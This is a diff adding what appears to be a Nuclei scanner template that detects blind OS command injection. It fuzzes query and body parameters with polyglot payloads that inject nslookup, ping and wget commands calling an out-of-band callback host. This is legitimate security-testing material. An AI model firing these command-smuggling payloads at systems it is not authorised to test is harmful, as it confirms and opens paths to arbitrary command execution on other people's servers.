@@ -1,0 +1,53 @@
+id: cmdi-blind-oast-polyglot
+
+info:
+  name: Blind OS Command Injection
+  author: pdteam,geeknik
+  severity: high
+  description: |
+    Potential blind OS command injection vulnerabilities, where the application constructs OS commands using unsanitized user input.
+    Successful exploitation could lead to arbitrary command execution on the system.
+  reference:
+    - https://portswigger.net/research/hunting-asynchronous-vulnerabilities
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
+  metadata:
+    max-request: 4
+  tags: cmdi,oast,dast,blind,polyglot,vuln
+
+variables:
+  marker: "{{interactsh-url}}"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+          - 'method == "POST"'
+          - 'method == "PUT"'
+    payloads:
+      payload:
+        - "&nslookup {{marker}}&'\\\"`0&nslookup {{marker}}&`'"
+        - "1;nslookup${IFS}{{marker}};#${IFS}';nslookup${IFS}{{marker}};#${IFS}\";nslookup${IFS}{{marker}};#${IFS}"
+        - "/*$(nslookup {{marker}})`nslookup {{marker}}``*/-nslookup({{marker}})-'/*$(nslookup {{marker}})`nslookup {{marker}}` #*/-nslookup({{marker}})||'\"||nslookup({{marker}})||\"/*`*/"
+        - "$(ping -c 1 {{marker}} | nslookup {{marker}} ; wget {{marker}} -O /dev/null)"
+
+    fuzzing:
+      - parts:
+          - query
+          - body
+        type: postfix
+        fuzz:
+          - "{{payload}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+# digest: 4b0a00483046022100ffa659b189fa15afd2deb641d4d7b3ad6fc998004693b214687229e64c044014022100a35d3b3c7ca81690c0c05e027ef0b95752a80e42a98e5902bb995e10d39e35b7:922c64590222798bb761d5b6d8e72950
